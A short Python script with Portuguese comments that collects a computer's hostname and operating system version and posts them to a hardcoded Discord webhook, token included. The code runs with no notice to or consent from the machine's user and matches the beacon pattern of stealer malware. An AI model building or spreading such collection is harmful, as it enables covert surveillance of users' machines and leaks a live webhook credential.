import requests
import platform
import socket

# URL do webhook do Discord
webhook_url = 'https://discord.com/api/webhooks/1267179289405689968/LF81UG85FOKiGwBcxrnc7pg4hrL_tYSR_hX8vFOv56spGcpOUy5-JTuUZKA6KSJtUqxr'

# Informações básicas do sistema
device_name = socket.gethostname()
os_info = platform.system() + " " + platform.release()

# Mensagem para enviar
message = f"Informações do dispositivo:\nNome do dispositivo: {device_name}\nSistema Operacional: {os_info}"

# Dados a serem enviados para o webhook
data = {
    "content": message,
    "username": "System Info Bot"
}

# Enviando o pedido
response = requests.post(webhook_url, json=data)

# Verificando se a requisição foi bem-sucedida
if response.status_code == 204:
    print("Mensagem enviada com sucesso!")
else:
    print(f"Falha ao enviar mensagem. Código de status: {response.status_code}")
